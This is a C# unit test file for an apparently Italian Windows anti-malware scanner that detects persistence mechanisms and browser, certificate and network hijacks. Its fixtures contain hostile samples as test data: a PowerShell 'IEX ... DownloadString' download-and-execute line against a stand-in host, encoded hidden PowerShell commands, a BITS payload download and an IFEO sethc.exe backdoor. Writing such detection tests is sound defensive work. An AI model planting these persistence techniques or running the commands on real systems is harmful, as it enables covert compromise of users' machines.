using System.Text;
using Tramontana.Core;
using Tramontana.Modules.Apps;
using Tramontana.Modules.Performance;
using Tramontana.Modules.Protection;
using Tramontana.Modules.Protection.Checks;
using Severity = Tramontana.Modules.Protection.Severity;

namespace Tramontana.Tests;

public class PersistenceChecksTests
{
    private const string Winlogon = @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
    private const string Ifeo = @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";

    [Fact]
    public void WinlogonIfeoAndAppInit()
    {
        var registry = new FakeRegistry()
            .Set(Winlogon, "Shell", @"explorer.exe,C:\Users\papa\AppData\Roaming\svc.exe")
            .Set(Winlogon, "Userinit", @"C:\Windows\system32\userinit.exe,")
            .Set($@"{Ifeo}\sethc.exe", "Debugger", @"C:\Windows\System32\cmd.exe")
            .Set($@"{Ifeo}\notepad.exe", "Debugger", @"""C:\Program Files\Microsoft Visual Studio\vsjitdebugger.exe"" -p %ld")
            .Set(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", "AppInit_DLLs", @"C:\ProgramData\hook.dll")
            .Set(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", "LoadAppInit_DLLs", 1);
        var signatures = new FakeSignatures().With(Path.Combine(Environment.SystemDirectory, "utilman.exe"), SignatureStatus.Unsigned);
        var byId = new WinlogonIfeoCheck().Run(Fake.Context(registry, signatures: signatures)).ToDictionary(f => f.Id);
        Assert.Equal(Severity.Danger, byId["winlogon|shell|tutti gli utenti"].Severity);
        Assert.Equal(@"C:\Users\papa\AppData\Roaming\svc.exe", byId["winlogon|shell|tutti gli utenti"].Path);
        Assert.False(byId.ContainsKey("winlogon|userinit|tutti gli utenti"));
        Assert.Equal(Severity.Danger, byId["ifeo|sethc.exe"].Severity);
        Assert.Contains("schermata di blocco", byId["ifeo|sethc.exe"].Title);
        Assert.Equal(Severity.Info, byId["ifeo|notepad.exe"].Severity);
        Assert.Equal(Severity.Danger, byId["appinit|False"].Severity);
        Assert.Equal(FindingAction.RemoveRegistryValue, byId["appinit|False"].Action);
        Assert.Equal(Severity.Danger, byId["accessibility-binary|utilman.exe"].Severity);
        Assert.False(byId.ContainsKey("accessibility-binary|sethc.exe"));
    }

    [Fact]
    public void WmiSubscriptionsAndBitsJobs()
    {
        var wmi = new FakeWmi()
            .Add(WmiBitsCheck.Scope, WmiBitsCheck.FiltersQuery, Fake.Row(("Name", "Updater"), ("Query", "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'")))
            .Add(WmiBitsCheck.Scope, WmiBitsCheck.CommandConsumersQuery, Fake.Row(("Name", "Updater"), ("CommandLineTemplate", "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA")),
                Fake.Row(("Name", "SCM Event Log Consumer"), ("CommandLineTemplate", "")))
            .Add(WmiBitsCheck.Scope, WmiBitsCheck.BindingsQuery, Fake.Row(("Filter", "__EventFilter.Name=\"Updater\""), ("Consumer", "CommandLineEventConsumer.Name=\"Updater\"")));
        var commands = new FakeCommands(new(StringComparer.OrdinalIgnoreCase)
        {
            ["bitsadmin.exe /list /verbose"] = "GUID: {1111-2222} DISPLAY: Win Update Helper\nSTATE: SUSPENDED\nNOTIFICATION COMMAND LINE: C:\\Users\\papa\\AppData\\Local\\Temp\\run.exe\n0 / 1 WORKING http://45.67.89.10/payload.bin -> C:\\Users\\papa\\x.bin\n" +
                                                "GUID: {3333-4444} DISPLAY: Edge Update\nSTATE: TRANSFERRED\nNOTIFICATION COMMAND LINE: none\n1 / 1 WORKING https://msedge.b.tlu.dl.delivery.mp.microsoft.com/x -> C:\\y\n",
        });
        var findings = new WmiBitsCheck().Run(Fake.Context(wmi: wmi, commands: commands)).ToList();
        var wmiFinding = Assert.Single(findings, f => f.Id == "wmi|Updater");
        Assert.Equal(Severity.Danger, wmiFinding.Severity);
        Assert.Contains("base64", wmiFinding.Reason);
        Assert.Contains("Evento: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'", wmiFinding.Evidence);
        Assert.DoesNotContain(findings, f => f.Id == "wmi|SCM Event Log Consumer");
        var bits = Assert.Single(findings, f => f.Id == "bits|{1111-2222}");
        Assert.Equal(Severity.Danger, bits.Severity);
        Assert.Contains("run.exe", bits.Reason);
        Assert.Equal(Severity.Info, Assert.Single(findings, f => f.Id == "bits|{3333-4444}").Severity);
    }

    [Fact]
    public void ComHijackInUserHive()
    {
        var registry = new FakeRegistry()
            .Set(@"HKCU\Software\Classes\CLSID\{AAAA}\InprocServer32", "", @"C:\Users\papa\AppData\Roaming\evil.dll")
            .Set(@"HKLM\SOFTWARE\Classes\CLSID\{AAAA}\InprocServer32", "", @"%SystemRoot%\system32\shell32.dll")
            .Set(@"HKCU\Software\Classes\CLSID\{BBBB}\TreatAs", "", "{AAAA}")
            .Set(@"HKCU\Software\Classes\CLSID\{DDDD}\TreatAs", "", "{EEEE}")
            .Set(@"HKLM\SOFTWARE\Classes\CLSID\{EEEE}\InprocServer32", "", @"C:\Program Files\Office\equation.dll")
            .Set(@"HKCU\Software\Classes\CLSID\{CCCC}\InprocServer32", "", @"C:\Users\papa\AppData\Local\Microsoft\OneDrive\x.dll");
        var byId = new ComHijackCheck().Run(Fake.Context(registry)).ToDictionary(f => f.Id);
        Assert.Equal(Severity.Danger, byId["com|shadow|{AAAA}|InprocServer32"].Severity);
        Assert.Equal(@"C:\Users\papa\AppData\Roaming\evil.dll", byId["com|shadow|{AAAA}|InprocServer32"].Path);
        Assert.Equal(Severity.Danger, byId["com|treatas|{BBBB}"].Severity);
        Assert.False(byId.ContainsKey("com|treatas|{DDDD}"));
        Assert.False(byId.ContainsKey("com|user|{CCCC}|InprocServer32"));
    }

    [Fact]
    public void LsaAndWinsockProviders()
    {
        var registry = new FakeRegistry()
            .Set(@"HKLM\SYSTEM\CurrentControlSet\Control\Lsa", "Security Packages", new[] { "kerberos", "msv1_0", "schannel", "mimilib" })
            .Set(@"HKLM\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries\000000000001", "PackedCatalogItem", Encoding.ASCII.GetBytes("%SystemRoot%\\system32\\mswsock.dll\0rest"))
            .Set(@"HKLM\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries\000000000002", "PackedCatalogItem", Encoding.ASCII.GetBytes("C:\\ProgramData\\lsp.dll\0rest"))
            .Set(@"HKLM\SOFTWARE\Microsoft\NetSh", "evil", "C:\\Users\\Public\\nethelper.dll");
        var byId = new ShellAndProvidersCheck().Run(Fake.Context(registry, signatures: new FakeSignatures(new SignatureInfo(SignatureStatus.Unsigned, null)))).ToDictionary(f => f.Id);
        Assert.Equal(Severity.Danger, byId["lsa|Security Packages|mimilib"].Severity);
        Assert.Equal(Severity.Danger, byId[@"dll|C:\ProgramData\lsp.dll"].Severity);
        Assert.False(byId.ContainsKey(@"dll|C:\Windows\system32\mswsock.dll"));
        Assert.Equal(Severity.Danger, byId[@"dll|C:\Users\Public\nethelper.dll"].Severity);
    }

    [Fact]
    public void PowerShellProfileAndOfficeStartup()
    {
        using var temp = new TempDir();
        string profile = temp.Dir("profile");
        var ps = temp.File(@"profile\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1");
        File.WriteAllText(ps, "# comment\nSet-Alias ll Get-ChildItem\nIEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')\n");
        var xlstart = temp.File(@"profile\AppData\Roaming\Microsoft\Excel\XLSTART\book.xlsm");
        var check = new ScriptsAndOfficeCheck();
        var findings = check.Run(Fake.Context(profile: profile)).ToList();
        var profileFinding = Assert.Single(findings, f => f.Id == $"psprofile|{ps}");
        Assert.Equal(Severity.Danger, profileFinding.Severity);
        Assert.Contains("Invoke-Expression", profileFinding.Reason);
        Assert.Contains(profileFinding.Evidence, e => e.StartsWith("IEX"));
        Assert.DoesNotContain(profileFinding.Evidence, e => e.StartsWith("Set-Alias"));
        var office = Assert.Single(findings, f => f.Id == $"officestart|{xlstart}");
        Assert.Equal(Severity.Warning, office.Severity);
    }

    [Fact]
    public void HiddenTasksFromTheTaskCache()
    {
        const string cache = @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache";
        var actions = Encoding.Unicode.GetBytes("\u0003\u0000powershell.exe\u0000-w hidden -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0000");
        var registry = new FakeRegistry()
            .Set($@"{cache}\Tasks\{{1}}", "Path", @"\Updater")
            .Set($@"{cache}\Tasks\{{1}}", "Actions", actions)
            .Key($@"{cache}\Tree\Updater")
            .Set($@"{cache}\Tasks\{{2}}", "Path", @"\Hidden")
            .Set($@"{cache}\Tasks\{{2}}", "Author", "")
            .Set($@"{cache}\Tree\Hidden", "Id", "{2}")
            .Set($@"{cache}\Tasks\{{3}}", "Path", @"\Microsoft\Windows\Good")
            .Set($@"{cache}\Tasks\{{3}}", "Author", "Microsoft Corporation")
            .Set($@"{cache}\Tasks\{{3}}", "Actions", Encoding.Unicode.GetBytes("\u0003\u0000%windir%\\system32\\sc.exe\u0000start w32time\u0000"))
            .Set($@"{cache}\Tree\Microsoft\Windows\Good", "SD", new byte[] { 1 })
            .Set($@"{cache}\Tree\Updater", "SD", new byte[] { 1 });
        var byId = new HiddenTasksCheck().Run(Fake.Context(registry)).ToDictionary(f => f.Id);
        Assert.Equal(Severity.Danger, byId[@"lolbintask|\Updater"].Severity);
        Assert.Contains("base64", byId[@"lolbintask|\Updater"].Reason);
        Assert.Equal(Severity.Danger, byId[@"hiddentask|\Hidden"].Severity);
        Assert.False(byId.ContainsKey(@"lolbintask|\Microsoft\Windows\Good"));
        Assert.Equal(["powershell.exe", "-w hidden -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAA"], HiddenTasksCheck.Strings(actions));
    }

    [Fact]
    public void ServicesAndDrivers()
    {
        const string services = @"HKLM\SYSTEM\CurrentControlSet\Services";
        var registry = new FakeRegistry()
            .Set($@"{services}\FakeSvc", "Type", 0x20).Set($@"{services}\FakeSvc", "Start", 2).Set($@"{services}\FakeSvc", "ImagePath", @"%SystemRoot%\System32\svchost.exe -k netsvcs")
            .Set($@"{services}\FakeSvc\Parameters", "ServiceDll", @"C:\ProgramData\fake\svc.dll")
            .Set($@"{services}\Unquoted", "Type", 0x10).Set($@"{services}\Unquoted", "Start", 2).Set($@"{services}\Unquoted", "ImagePath", @"C:\Program Files\Vendor Tools\svc.exe -run")
            .Set($@"{services}\BadDrv", "Type", 1).Set($@"{services}\BadDrv", "Start", 1).Set($@"{services}\BadDrv", "ImagePath", @"\??\C:\Users\papa\AppData\Local\Temp\drv.sys")
            .Set($@"{services}\GoodDrv", "Type", 1).Set($@"{services}\GoodDrv", "Start", 1).Set($@"{services}\GoodDrv", "ImagePath", @"\SystemRoot\System32\drivers\good.sys")
            .Set($@"{services}\Off", "Type", 0x10).Set($@"{services}\Off", "Start", 4).Set($@"{services}\Off", "ImagePath", @"C:\Users\papa\AppData\Roaming\x.exe");
        var byId = new ServicesAndDriversCheck().Run(Fake.Context(registry, signatures: new FakeSignatures(new SignatureInfo(SignatureStatus.Unsigned, null)))).ToDictionary(f => f.Id);
        Assert.Equal(Severity.Danger, byId["svchost|FakeSvc"].Severity);
        Assert.Equal(@"C:\ProgramData\fake\svc.dll", byId["svchost|FakeSvc"].Path);
        Assert.Equal(Severity.Warning, byId["unquoted|Unquoted"].Severity);
        Assert.Equal(Severity.Danger, byId["driver|BadDrv"].Severity);
        Assert.False(byId.ContainsKey("driver|GoodDrv"));
        Assert.False(byId.Keys.Any(k => k.EndsWith("|Off")));
        Assert.Equal(Path.Combine(KnownPaths.Windows, @"System32\drivers\x.sys"), ServicesAndDriversCheck.DriverPath(@"\SystemRoot\System32\drivers\x.sys"));
        Assert.Equal(@"C:\Users\papa\drv.sys", ServicesAndDriversCheck.DriverPath(@"\??\C:\Users\papa\drv.sys"));
    }

    [Fact]
    public void RecentProgramsWithPupNames()
    {
        var programs = new List<InstalledProgram>
        {
            new() { Id = "a", Name = "PC Speed Booster Pro", InstallDate = DateTime.Now.AddDays(-3), Publisher = null, UninstallString = @"C:\Program Files\Booster\unins.exe" },
            new() { Id = "b", Name = "7-Zip", InstallDate = DateTime.Now.AddDays(-3), Publisher = "Igor Pavlov", UninstallString = @"C:\Program Files\7-Zip\Uninstall.exe" },
            new() { Id = "c", Name = "Old", InstallDate = DateTime.Now.AddDays(-400), Publisher = null },
        };
        var context = new CheckContext { Registry = new FakeRegistry(), Wmi = new FakeWmi(), Commands = new FakeCommands(),
            Signatures = new FakeSignatures(new SignatureInfo(SignatureStatus.Signed, "Igor Pavlov")), Startup = [], Programs = programs };
        var byId = new RecentProgramsCheck().Run(context).ToDictionary(f => f.Id);
        Assert.Equal(Severity.Warning, byId["program|a"].Severity);
        Assert.Contains("indesiderati", byId["program|a"].Reason);
        Assert.Equal(Severity.Info, byId["program|b"].Severity);
        Assert.False(byId.ContainsKey("program|c"));
    }

    [Fact]
    public void BrowserPoliciesAndChromiumProfile()
    {
        using var temp = new TempDir();
        var registry = new FakeRegistry()
            .Set(@"HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist", "1", "abcdefghijklmnopabcdefghijklmnop;https://clients2.google.com/service/update2/crx")
            .Set(@"HKLM\SOFTWARE\Policies\Microsoft\Edge", "DefaultSearchProviderSearchURL", "https://search.fastfinder.example/?q={searchTerms}")
            .Set(@"HKLM\SOFTWARE\Policies\Microsoft\Edge", "HomepageLocation", "https://www.bing.com");
        var byId = new BrowserHijackCheck().Run(Fake.Context(registry)).ToDictionary(f => f.Id);
        Assert.Equal(Severity.Danger, byId["policy-ext|Google Chrome|abcdefghijklmnopabcdefghijklmnop"].Severity);
        Assert.Equal("1", byId["policy-ext|Google Chrome|abcdefghijklmnopabcdefghijklmnop"].Registry!.ValueName);
        Assert.Equal(Severity.Danger, byId["policy|Microsoft Edge|DefaultSearchProviderSearchURL"].Severity);
        Assert.False(byId.ContainsKey("policy|Microsoft Edge|HomepageLocation"));

        string profile = temp.Dir("Default");
        File.WriteAllText(Path.Combine(profile, "Preferences"), """{"homepage":"http://search-helper.example/home","homepage_is_newtabpage":false,"session":{"restore_on_startup":4,"startup_urls":["https://www.google.com","http://ads.example/start"]},"default_search_provider_data":{"template_url_data":{"short_name":"Fast","url":"https://fastsearch.example/?q={searchTerms}"}}}""");
        var profileFindings = BrowserHijackCheck.ChromiumProfile("Test", profile).ToDictionary(f => f.Id);
        Assert.Equal(Severity.Warning, profileFindings["hijack|Test/Default|homepage"].Severity);
        Assert.Equal(Severity.Danger, profileFindings["hijack|Test/Default|search"].Severity);
        Assert.Contains("startup_urls: http://ads.example/start", profileFindings["hijack|Test/Default|startup"].Evidence);
        Assert.True(BrowserHijackCheck.IsKnownSearch("www.google.it"));
        Assert.False(BrowserHijackCheck.IsKnownSearch("fastsearch.example"));
    }

    [Fact]
    public void TrustedRoots()
    {
        var certificates = new FakeCertificates(
            new RootCertificate("computer", "CN=DigiCert Global Root G2, O=DigiCert Inc", "CN=DigiCert Global Root G2, O=DigiCert Inc", DateTime.Now.AddYears(-1), "A"),
            new RootCertificate("computer", "CN=SuperAds Root CA", "CN=SuperAds Root CA", DateTime.Now.AddDays(-20), "B"),
            new RootCertificate("computer", "CN=Old Corp CA", "CN=Old Corp CA", DateTime.Now.AddYears(-6), "C"),
            new RootCertificate("utente", "CN=mitmproxy", "CN=mitmproxy", DateTime.Now.AddDays(-5), "D"),
            new RootCertificate("utente", "CN=Microsoft Root Certificate Authority 2011", "CN=Microsoft Root Certificate Authority 2011", DateTime.Now.AddYears(-10), "E"),
            new RootCertificate("computer", "CN=Leaf", "CN=Some Issuer", DateTime.Now, "F"));
        var context = new CheckContext { Registry = new FakeRegistry(), Wmi = new FakeWmi(), Commands = new FakeCommands(), Signatures = new FakeSignatures(), Startup = [], Certificates = certificates };
        var byId = new TrustedRootsCheck().Run(context).ToDictionary(f => f.Id);
        Assert.Equal(Severity.Danger, byId["root|B"].Severity);
        Assert.Equal(Severity.Info, byId["root|D"].Severity);
        Assert.False(byId.ContainsKey("root|A"));
        Assert.False(byId.ContainsKey("root|C"));
        Assert.False(byId.ContainsKey("root|F"));
        Assert.False(byId.ContainsKey("root|E")); // the user's store view includes the machine roots
    }

    [Fact]
    public void DnsAndFirewallRules()
    {
        using var temp = new TempDir();
        var exe = temp.File(@"Downloads\rat.exe");
        var wmi = new FakeWmi().Add(@"root\cimv2", NetworkConfigCheck.DnsQuery,
            Fake.Row(("Description", "Ethernet"), ("DNSServerSearchOrder", new[] { "192.168.1.1", "45.67.89.10" }), ("DHCPEnabled", false)),
            Fake.Row(("Description", "Wi-Fi"), ("DNSServerSearchOrder", new[] { "1.1.1.1" }), ("DHCPEnabled", true)));
        var registry = new FakeRegistry()
            .Set(@"HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules", "{R1}", $"v2.33|Action=Allow|Active=TRUE|Dir=In|Protocol=6|App={exe}|Name=rat|")
            .Set(@"HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules", "{R2}", $"v2.33|Action=Block|Active=TRUE|Dir=In|App={exe}|Name=blocked|");
        var signatures = new FakeSignatures().With(exe, SignatureStatus.Unsigned);
        var byId = new NetworkConfigCheck().Run(Fake.Context(registry, wmi, signatures: signatures, profile: temp.Path)).ToDictionary(f => f.Id);
        Assert.Equal(Severity.Warning, byId["dns|Ethernet"].Severity);
        Assert.Contains("45.67.89.10", byId["dns|Ethernet"].Title);
        Assert.False(byId.ContainsKey("dns|Wi-Fi"));
        Assert.Equal(Severity.Warning, byId["fwrule|{R1}"].Severity);
        Assert.False(byId.ContainsKey("fwrule|{R2}"));
    }
}
